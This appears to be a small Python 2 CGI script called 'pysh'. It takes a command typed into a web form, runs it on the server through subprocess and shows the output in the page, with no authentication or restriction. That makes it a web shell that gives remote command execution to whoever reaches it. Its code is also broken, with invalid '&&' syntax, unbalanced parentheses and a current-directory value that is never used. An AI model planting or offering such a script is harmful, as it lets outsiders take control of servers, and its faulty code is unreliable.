#!/usr/bin/env python

import cgi, shlex
import cgitb; cgitb.enable()  # for troubleshooting
import shlex, subprocess

print "Content-type: text/html"
print

print """
<html>

<head><title>pysh</title></head>

<body>
"""

form = cgi.FieldStorage()
command = form.getvalue("command", "")
args = shlex.split(command)
currDir = form.getvalue("currDir", ".")
if ((args[0]=="cd") && (args[1]!=0):
  currDir = args[1]; 
outputStr = subprocess.check_output(args,stdin=None, stderr=None, shell=False, universal_newlines=False)

print """
  <div>$ %s</div>
  <div> 
    <form>
      <p>$ <input type="text" name="command"/></p>
      <input type="hidden" name="currDir" value="%s"/>
    </form>
  </div>
  <pre>
  %s
  </pre>
</body>
</html>
""" % (args, currDir, outputStr)

